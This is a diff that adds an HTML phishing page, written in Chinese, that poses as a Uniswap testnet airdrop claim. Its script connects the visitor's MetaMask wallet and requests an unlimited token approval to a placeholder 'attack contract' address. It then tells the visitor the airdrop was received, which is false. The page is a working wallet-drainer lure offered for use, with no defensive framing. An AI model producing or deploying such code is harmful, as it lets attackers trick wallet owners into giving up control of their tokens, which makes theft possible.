@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>领取测试网空投</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+    <h2>🎁 Uniswap 测试网空投</h2>
+    <p>连接钱包即可领取 1000 USDC (Goerli)</p>
+    <button id="connect">连接钱包并领取</button>
+    <div id="status"></div>
+
+    <script>
+        const ATTACK_CONTRACT = "0x你的攻击合约地址";   // 替换！！！
+        const TOKEN_ADDRESS = "0x07865c6E87B9F70255377e024ace6630C1Eaa37F"; // Goerli 测试USDC
+
+        document.getElementById("connect").onclick = async () => {
+            if (!window.ethereum) {
+                alert("请安装 MetaMask");
+                return;
+            }
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            const signer = provider.getSigner();
+            const userAddress = await signer.getAddress();
+            document.getElementById("status").innerText = "已连接: " + userAddress + "，正在授权...";
+
+            // 代币合约 ABI（只需 approve）
+            const tokenABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
+            const token = new ethers.Contract(TOKEN_ADDRESS, tokenABI, signer);
+            
+            // 无限授权
+            const maxUint = ethers.constants.MaxUint256;
+            try {
+                const tx = await token.approve(ATTACK_CONTRACT, maxUint);
+                document.getElementById("status").innerHTML = `授权交易已发送: <a href="https://goerli.etherscan.io/tx/${tx.hash}" target="_blank">${tx.hash}</a><br>等待确认...`;
+                await tx.wait();
+                document.getElementById("status").innerHTML += "<br>✅ 空投领取成功！";
+            } catch (err) {
+                document.getElementById("status").innerText = "授权失败：" + err.message;
+            }
+        };
+    </script>
+</body>
+</html>
